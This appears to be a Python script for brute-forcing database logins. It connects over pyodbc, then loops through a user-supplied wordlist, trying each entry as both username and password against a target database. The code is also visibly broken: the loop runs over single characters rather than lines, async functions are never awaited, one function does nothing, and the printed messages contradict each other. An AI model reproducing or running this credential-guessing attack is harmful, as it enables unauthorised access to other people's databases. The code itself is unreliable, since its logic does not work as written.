import pyodbc
from colorama  import Fore,init
import asyncio


async def attack_the_data_base(path):
    with open(path, "r") as file:

        payload = file.read()

        rows = payload.split("\n")

        sorted_rows = sorted(rows)

        sorted_payload = "\n".join(sorted_rows)





init()

async def check_database_authentication(db, host, DBname, username, password):
    try:
        # Attempt to connect to the database
        conn = pyodbc.connect(f'DRIVER={db};SERVER={host};DATABASE={DBname};UID={username};PWD={password}')
        conn.close()
        print(Fore.GREEN+"Authentication successful. The database requires a username and password.")
        print(Fore.BLUE+"Note: If the database does not require a username and password, the provided credentials are incorrect.")
        ask = input(Fore.GREEN+"The database needs the Username and password.Do you want to select a wordlist?")
        if ask == "y":
            path = input("enter a path to the wordlist:")
            with open(path, "r") as file:

                payload = file.read()

                rows = payload.split("\n")

                sorted_rows = sorted(rows)

                sorted_payload = "\n".join(sorted_rows)
                for line in sorted_payload:
                    params = {
                        "username": line,
                        "password": line
                    }
                    conn = pyodbc.connect(f'DRIVER={db};SERVER={host};DATABASE={DBname};UID={line};PWD={line}')

                

            print(Fore.RED + str(sorted_payload))
    except pyodbc.OperationalError as e:
        print(Fore.RED+"Authentication failed. The database may not require a username and password or the provided credentials are incorrect.")
        print(Fore.BLUE+f"Error message: {e}")

# Provide the necessary details
db = 'your_db_driver'  # Replace with the appropriate database driver name
host = 'your_host'  # Replace with the database host
DBname = 'your_database_name'  # Replace with the name of your database
username = 'your_username'  # Replace with the username
password = 'your_password'  # Replace with the password

# Call the function to check authentication
check_database_authentication(db, host, DBname, username, password)